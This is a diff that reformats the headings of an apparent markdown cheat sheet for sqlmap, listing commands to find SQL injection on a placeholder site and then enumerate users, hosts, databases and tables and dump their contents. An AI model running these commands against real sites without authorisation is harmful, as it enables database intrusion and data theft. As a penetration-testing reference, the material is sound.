@@ -14,66 +14,66 @@ Environment:  Python
 git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 ```
 
-## Example Usages
+# Example Usages
 
-To get a list of basic options and switches:
+### To get a list of basic options and switches
 ```
 python sqlmap.py -h
 ```
 
-To get a list of all options and switches:
+### To get a list of all options and switches
 ```
 python sqlmap.py -hh
 ```
 
-### <mark style="background: #D2B3FFA6;">Vulnerability Finding</mark>
+### Vulnerability Finding
 
-### <mark style="background: #FFF3A3A6;">ALL IN ONE</mark>
+### ALL IN ONE
 ```
 sqlmap -u url.com --threads 5 --level 5 --risk 3 --v 1 --batch
 ```
  
-***Auto Select default features
+### Auto Select default features
 ```
 sqlmap -u url.com/news.php?id=1 --batch
 ```
 
-***Crawling the URL 
+### Crawling the URL 
 ```
 sqlmap -u url.com --crawl depth --batch
 ```
 
-***Union attack
+### Union attack
 
 ```
 sqlmap -u url.com --crawl 5 --technique="U" --batch
 ```
 
-***Thread ---using multiple connection for faster result, default 1, [range= 1 to 10]
+### Thread ---using multiple connection for faster result, default 1, [range= 1 to 10]
 ```
 sqlmap -u url.com --crawl 5 --threads [1 to 10] --batch
 ```
  
-***Risk -- harm level of payloads used, default 1, [range=1 to 3]
+### Risk -- harm level of payloads used, default 1, [range=1 to 3]
 
 ```
 sqlmap -u url.com --crawl 5 --risk 3
 ```
 
-***Level -- test in the cookies; default 1, [range=1 to 5]
+### Level -- test in the cookies; default 1, [range=1 to 5]
 
 ```
 sqlmap -u url.com --crawl 5 --level 5
 ```
 
-***Verbosity , default 0,[range=0 to 6]
+### Verbosity , default 0,[range=0 to 6]
 ```
 sqlmap -u url.com --crawl 5 --batch --v 6
 ```
 
-### <mark style="background: #D2B3FFA6;">Post Exploitation</mark>
+## Post Exploitation
 
-***User Enumeration; after finding a vulnerable parameter
+### User Enumeration; after finding a vulnerable parameter
 
 ```
 sqlmap -u url.com/news.php?id=1 --current-user --batch
@@ -83,33 +83,33 @@ sqlmap -u url.com/news.php?id=1 --current-user --batch
 sqlmap -u url.com/news.php?id=1 --hostname --batch
 ```
 
-***Getting current database name
+### Getting the current database name
 ```
 sqlmap -u url.com/news.php?id=1 --current-db --batch
 ```
 
 
-***Getting tables in database
+### Getting tables in a database
 ```
 sqlmap -u url.com/news.php?id=1 -D database_name --tables
 ```
 
-***Getting All columns in a table
+### Getting All columns in a table
 ```
 sqlmap -u url.com/news.php?id=1 -D database_name -T table_name --dump
 ```
 
-***Getting a specific Column Type in a specific table
+### Getting a specific Column Type in a specific table
 ```
 sqlmap -u url.com/news.php?id=1 -D database_name -T table_name --columns
 ```
 
-***Getting all tables in a database
+### Getting all tables in a database
 ```
 sqlmap -u url.com/news.php?id=1 -D database_name --dump-all
 ```
 
-***Getting all database details
+### Getting all database details
 ```
 sqlmap -u url.com/news.php?id=1 --dbs
 ```
